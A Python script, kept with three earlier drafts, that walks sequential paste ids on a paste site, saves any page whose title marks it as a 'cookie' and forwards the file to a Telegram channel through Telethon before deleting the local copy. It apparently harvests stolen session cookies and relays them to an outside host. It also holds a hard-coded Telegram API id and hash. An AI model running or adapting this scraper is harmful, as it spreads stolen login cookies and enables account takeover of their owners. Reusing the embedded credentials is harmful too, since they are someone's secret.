'''import requests
from bs4 import BeautifulSoup as bs
url = 'https://m.rttar.com/paste.php?id=12496'
res = requests.get(url)
soup = bs(res.text, 'html.parser')
data = soup.findAll('div', attrs={'class':'panel-body'})
print(soup.title.text)
print(data[1].text.strip()) '''

'''import requests
from bs4 import BeautifulSoup as bs
from time import sleep
num = 12496
while True:
    url = 'https://m.rttar.com/paste.php?id='+str(num)
    res = requests.get(url)
    soup = bs(res.text, 'html.parser')
    if '-' in soup.title.text:
        print('Cookie Found:', soup.title.text)
        data = soup.findAll('div', attrs={'class': 'panel-body'})
        with open(str(num)+' - '+soup.title.text+'.txt', 'w+') as file:
            file.write(data[1].text.strip().replace('\n',''))
        print('Sleeping for 60 seconds...')
        sleep(60)
        num += 1
    else:
        print('No cookie found. Sleeping for 60 seconds...')
        sleep(60)
        num += 1'''

'''from telethon import TelegramClient
api_id = 1015622
api_hash = '8bd892b1c3446a452c97700065350e52'
client = TelegramClient('anoni', api_id, api_hash)

async def main():
    await client.send_file(-1001864302223, 'n5 - Paste.txt')

with client:
    client.loop.run_until_complete(main())'''

import requests
from bs4 import BeautifulSoup as bs
from time import sleep
from telethon import TelegramClient
import os

num = 12496
api_id = 1015622
api_hash = '8bd892b1c3446a452c97700065350e52'
client = TelegramClient('anoni', api_id, api_hash)

while True:
    url = 'https://m.rttar.com/paste.php?id='+str(num)
    res = requests.get(url)
    soup = bs(res.text, 'html.parser')

    if '-' in soup.title.text:
        print('Cookie Found:', soup.title.text)
        data = soup.findAll('div', attrs={'class': 'panel-body'})

        with open(soup.title.text+'.txt', 'w+') as file:
            file.write(data[1].text.strip().replace('\n',''))

        async def main():
            await client.send_file(-1001864302223, soup.title.text+'.txt')

        with client:
            client.loop.run_until_complete(main())

        os.remove(soup.title.text+'.txt')

        print('Sleeping for 60 seconds...')
        sleep(60)
        num += 1
    else:
        print('No cookie found. Sleeping for 180 seconds...')
        sleep(180)
        num += 1
